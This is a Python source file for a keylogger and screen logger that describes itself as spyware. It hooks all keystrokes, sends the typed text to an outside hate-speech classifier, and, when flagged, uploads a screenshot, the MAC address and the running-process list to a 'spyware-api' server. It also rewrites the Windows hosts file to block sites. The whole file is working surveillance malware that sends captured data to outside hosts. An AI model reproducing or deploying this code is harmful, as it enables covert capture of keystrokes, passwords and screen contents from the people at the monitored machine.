import keyboard                             # For Keylogger
from threading import Timer                 # For Keylogger
from getmac import get_mac_address as gma   # For Mac Address
from PIL import ImageGrab                   # For ScreenLogger
import base64                               # For ScreenLogger
import requests                             # For API
import json                                 # For API
import io                                   # For ScreenLogger
import psutil as ps                         # For process
import time                                 # For API
import credenciais as cr                    # For API
import threading

SEND_REPORT_EVERY = 30

def block_DNS():
    import csv
    path = r"C:\Windows\System32\drivers\etc\hosts"
    redirect = "\n127.0.0.1"
    websites = []
    with open('sites.csv') as file:
        read_csv = csv.reader(file)
        for row in read_csv:
            websites.append(row[0])
    with open(path, 'r+') as file:
        content = file.read()
        for site in websites:
            if site in content:
                pass
            else:
                file.write(redirect + " " + site + "\n")

def isHateSpeech(self):
    dataLogs = json.dumps({"valor": 0, "frase": self.log})
    header = {'Content-type': 'application/json'}
    hateSpeech = requests.post("https://hate-speech-portuguese.herokuapp.com/predict", data=dataLogs, headers=header)

    hateSpeechJson = json.loads(hateSpeech.content)
    print(hateSpeechJson)
    if hateSpeechJson[0]['valor'] == 1:
        return True

    return False

def isBadLanguage(self):
    log_tokenized = self.log.split()
    with open('badLanguage.txt', encoding="utf8") as file:
        contents = file.read().split(';')
        for word in log_tokenized:
            if word.lower() in contents:
                return True

def getProcess(self):
    infoSet = set()
    for proc in ps.process_iter():
        info = proc.as_dict(attrs=['pid', 'name'])
        infoSet.add(info['name'])
    process = ''
    for t in infoSet:
        process = process + t + ','

    return process

def getImage(self):
    buffer = io.BytesIO()
    image = ImageGrab.grab()
    image.save(buffer, format='png')
    image.close()
    b64_str = base64.b64encode(buffer.getvalue())

    return str(b64_str)

def doLogin(self):
    dataUser = json.dumps({"login": cr.login, "password": cr.password})
    token = requests.post("https://spyware-api.herokuapp.com/login", dataUser).text
    return {
        'Authorization': 'Bearer ' + token,
        'Content-type': 'application/json'
    }

def sendAlert(self):
    headers = doLogin(self)

    try:
        dataImage = json.dumps({"id": 0, "productImg": self.log, "base64Img": getImage(self)}, sort_keys=True, indent=4)
        image = requests.post("https://spyware-api.herokuapp.com/imagem/save", dataImage,
                              headers=headers)
        imageJson = json.loads(image.content)

        dataAlert = json.dumps({"pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess(self)}, sort_keys=True, indent=4)
        alert = requests.post("https://spyware-api.herokuapp.com/alerta/save", dataAlert, headers=headers)

        print(alert)
        print("Alert Saved")
        time.sleep(10)
    except Exception:
        print("Error to send Alert")
        pass

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = ""
                self.log = self.log[:-1]
            elif name == "ctrl":
                name = ""
            elif name == "shift" or name == "caps lock":
                name = ""
            # else:
            #     name = name.replace(" ", "_")
            #     name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log and (isHateSpeech(self) or isBadLanguage(self)):
            sendAlert(self)

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    threading.Thread(target=block_DNS()).start()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
